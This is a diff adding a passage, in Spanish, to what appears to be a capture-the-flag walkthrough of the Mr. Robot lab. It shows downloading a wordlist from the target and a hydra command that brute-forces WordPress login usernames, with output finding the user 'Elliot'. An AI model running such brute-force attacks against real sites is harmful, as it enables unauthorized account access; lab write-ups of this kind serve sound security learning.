@@ -83,3 +83,26 @@ User-agent: *
 fsocity.dic
 key-1-of-3.txt
 ```
+Con un wget nos descargaremos este diccionario, lo limpiaremos debido a que hay muchas lineas repetidas.
+```bash
+wget http://10.10.196.195/fsocity.dic
+sort -u archivo.txt > archivo_sin_repetidos.txt
+```
+Haremos un ataque de fuerza bruta con hydra únicamnete hacia el usuario, veremos que si el usuario existe el codigo de error es diferente y nos lo detecta.
+Los parámetros del forumalario los podemos verificar enviando la petición de login hacia burpsuite.
+```bash
+└─$ hydra -I -L fsocity_clean.dic -p x 10.10.196.195 https-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submitLog%20In&testcookie=1:F=Invalid username" -t30
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizatins, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-25 23:02:24
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:11452/p:1), ~382 tries per task
+[DATA] attacking http-post-forms://10.10.196.195:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log%20In&testcooke=1:F=Invalid username
+[STATUS] 1365.00 tries/min, 1365 tries in 00:01h, 10087 to do in 00:08h, 30 active
+[STATUS] 1106.33 tries/min, 3319 tries in 00:03h, 8133 to do in 00:08h, 30 active
+[443][http-post-form] host: 10.10.196.195   login: Elliot   password: x
+[443][http-post-form] host: 10.10.196.195   login: elliot   password: x
+[443][http-post-form] host: 10.10.196.195   login: ELLIOT   password: x
+[STATUS] 1028.86 tries/min, 7202 tries in 00:07h, 4250 to do in 00:05h, 30 active
+
+```
